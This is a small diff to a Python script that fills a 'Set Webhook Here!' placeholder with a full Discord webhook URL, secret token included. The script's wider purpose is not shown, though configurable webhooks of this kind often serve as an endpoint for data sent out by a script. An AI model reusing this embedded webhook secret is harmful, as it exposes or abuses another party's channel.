@@ -7,7 +7,7 @@ import os
 import requests
 
 #Set Webhook Here! 
-url = "Webhook goes here"
+url = "https://discord.com/api/webhooks/968683418571374653/kwIYoiEGMKlMzwpycn_JOg_iP7uiJoAUcJtiVFzHVd8IOpCvqeMQ2TCOGnwitJyosk8T"
 
 
 # Developer: NightfallGT
